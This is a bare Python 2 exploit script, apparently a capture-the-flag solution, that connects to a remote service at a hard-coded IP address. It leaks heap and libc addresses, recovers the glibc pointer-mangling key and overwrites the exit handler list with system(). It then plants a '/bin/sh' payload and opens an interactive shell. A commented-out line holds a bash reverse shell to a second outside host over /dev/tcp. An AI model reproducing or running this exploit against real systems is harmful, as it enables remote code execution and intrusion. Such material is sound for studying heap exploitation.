import socket
import struct
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def new_double_array(name, size, t):
    f.write(p(4))
    f.write(name.ljust(256, 'A'))
    f.write(p(size))
    f.write(p(t))
    f.write('A' * size * 8)
    f.read(4)

def new_string(name, t):
    f.write(p(4))
    f.write(name.ljust(256, 'A'))
    f.write(p(0)) # whatever
    f.write(p(t))
    f.write(p(0)) # string index 0
    f.read(4)

def login(name):
    f.write(p(1))
    f.write(name.ljust(256, 'L'))
    print 'Login: ' + f.read(4).encode('hex')

def edit(index, offset_index, data):
    f.write(p(8))
    f.write(p(index))
    f.write(p(offset_index))
    f.write(data)
    f.read(4)

def get(index):
    f.write(p(5))
    f.write(p(index))
    t = f.read(4)
    size = f.read(4)
    content = f.read(up(size))
    status = f.read(4)
    return (t, size, content, status)

host = '202.120.7.114'
port = 8585

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

print f.read(4).encode('hex') # head

login('miao') # loggedin --> 1

# 0xf9610420 first buffer
# 0xf96104a0 second struct

# head->B->A
# on heap:
# A
# B
new_double_array('miaow', 120, 0x15) # double_array A
new_string('miaot', 0x16) # string B

_type, size, content, status = get(1)
string0_addr = up(content[0x4a8 - 0x420:0x4a8 - 0x420 + 4])
print 'string0_addr: %s' % (hex(string0_addr))
prog_base = string0_addr - 0x2bb0
print 'prog_base_addr: %s' % (hex(prog_base))
libc_base = prog_base - 0x1dc000
print 'libc_base_addr: %s' % (hex(libc_base))
ld_base = prog_base - 0x22000
print 'ld_base: %s' % (hex(ld_base))
gs_base = libc_base - 0x6c0
print 'gs: %s' % (hex(gs_base))

data = p(1) # 4a0
data += p(0x15) # 4a4
edit(1, (0x4a0 - 0x420) / 8, data)

data = p(gs_base + 24) # 4a8
data += p(1) # 4ac size
edit(1, (0x4a8 - 0x420) / 8, data)

_type, size, content, status = get(0)
xor_key = up(content[0:4])
print 'xor_key: %s' % hex(xor_key)

# calling fini -> dl_fini

# exit -> initial
initial_address = libc_base + 0x1ac1e0
print 'initial_addr: %s' % hex(initial_address)
system_addr = libc_base + 0x40190

def rshift(val, n):
  return val>>n if val >= 0 else (val+0x100000000)>>n

def ror(i, c):
  return (rshift(i, c) |  (i << (32-c))) & 0xffffffff

def rol(i, c):
  return (i<<c | rshift(i, 32-c)) & 0xffffffff

encrypted_system_addr = rol(system_addr ^ xor_key, 9)

#payload = '/bin/bash -i 0<&4 >& /dev/tcp/202.120.7.111/1337\x00'.ljust(72, 'A')
payload = '/bin/sh 0<&4 1>&4\x00'.ljust(48, 'A')
for i in range(len(payload) / 8):
    d = payload[i * 8:i * 8 + 8]

    data = p(gs_base + 0x100 + i * 8)
    data += p(1)
    edit(1, (0x4a8 - 0x420) / 8, data)

    edit(0, 0, d)

data = p(initial_address + 0xc) # 4a8
data += p(1) # 4ac size
edit(1, (0x4a8 - 0x420) / 8, data)

binsh = libc_base + 0x161344
data = p(encrypted_system_addr)
data += p(gs_base + 0x100)
edit(0, 0, data)

raw_input('wait')

f.write(p(9))
f.read(4)

t = telnetlib.Telnet()
t.sock = s
t.interact()
